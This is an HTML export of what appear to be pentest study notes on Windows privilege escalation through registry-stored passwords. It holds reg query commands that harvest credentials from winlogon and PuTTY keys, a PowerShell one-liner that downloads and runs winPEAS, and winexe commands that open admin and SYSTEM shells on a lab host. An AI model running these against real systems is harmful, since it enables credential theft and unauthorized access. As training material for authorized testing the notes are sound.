<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Registry</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>Registry</h1><br />• Plenty of programs store configuration options in the Windows
    Registry.<br />• Windows itself sometimes will store passwords in plaintext in the Registry.<br />• It is always
    worth searching the Registry for passwords.<br /><br /><strong>Searching the Registry for
      Passwords</strong><br />The following commands will search the registry for keys and values that contain
    “password”<br />
    <div class="codebox">
      <div class="codebox">
        C:\&gt;&nbsp;reg&nbsp;query&nbsp;HKLM&nbsp;/f&nbsp;password&nbsp;/t&nbsp;REG_SZ&nbsp;/s&nbsp;&nbsp;&nbsp;#local&nbsp;machine<br />C:\&gt;&nbsp;reg&nbsp;query&nbsp;HKCU&nbsp;/f&nbsp;password&nbsp;/t&nbsp;REG_SZ&nbsp;/s&nbsp;&nbsp;&nbsp;#current&nbsp;user
      </div>
    </div><br />ATTENTION: This usually generates a lot of results, so often it is more fruitful to look in known
    locations.<br /><br /><strong>Privilege Escalation</strong><br />1. WinPEAS generally check for service
    misconfigurations: <a
      href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe" target="_blank">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe</a><br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;&nbsp;(new-object&nbsp;System.Net.WebClient).DownloadFile(&quot;https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe&quot;,&nbsp;&quot;$env:userprofile\desktop\winPEASany.exe&quot;);Invoke-Expression&nbsp;&quot;$env:userprofile\desktop\winPEASany.exe&nbsp;quiet&nbsp;filesinfo&nbsp;userinfo&quot;;Remove-Item&nbsp;-Path&nbsp;&quot;$env:userprofile\desktop\winPEASany.exe&quot;;
      </div>
    </div><br /> <a href=""><img src="images/1330-1.png" alt="images/1330-1.png" /></a><br />2. Verify manually:<br /> ◇
    winlogon:<br />
    <div class="codebox">
      <div class="codebox">
        C:\&gt;&nbsp;reg&nbsp;query&nbsp;&quot;HKLM\Software\Microsoft\Windows&nbsp;NT\CurrentVersion\winlogon&quot;&nbsp;&nbsp;
      </div>
    </div><br /> ◇ putty SSH:<br />
    <div class="codebox">
      <div class="codebox">C:\&gt;&nbsp;reg&nbsp;query&nbsp;&quot;HKCU\Software\SimonTatham\PuTTY\Sessions&quot;&nbsp;/s
      </div>
    </div><br /> <a href=""><img src="images/1330-2.png" alt="images/1330-2.png" /></a><br />3. ipv4 of target
    machine<br /> <a href=""><img src="images/1330-3.png" alt="images/1330-3.png" /></a><br />4. On Kali, we can use the
    winexe command to spawn a shell using these credentials:<br />
    <div class="codebox">
      <div class="codebox">
        root@kali:/#&nbsp;winexe&nbsp;-U&nbsp;&#39;admin%password123&#39;&nbsp;//192.168.147.210&nbsp;cmd.exe<br />C:\&gt;&nbsp;net&nbsp;localgroup&nbsp;administrators&nbsp;&nbsp;&nbsp;&nbsp;#to&nbsp;check&nbsp;if&nbsp;the&nbsp;user&nbsp;is&nbsp;a&nbsp;local&nbsp;administrator
      </div>
    </div><br /> <a href=""><img src="images/1330-4.png" alt="images/1330-4.png" /></a><br /> since this user is an an
    admin, we can also have a SYSTEM shell with these credentials<br />
    <div class="codebox">
      <div class="codebox">
        root@kali:/#&nbsp;winexe&nbsp;-U&nbsp;&#39;admin%password123&#39;&nbsp;--system&nbsp;//192.168.147.210&nbsp;cmd.exe
      </div>
    </div><br /> <a href=""><img src="images/1330-5.png" alt="images/1330-5.png" /></a><br /><br /><br />
  </div>
</body>

</html>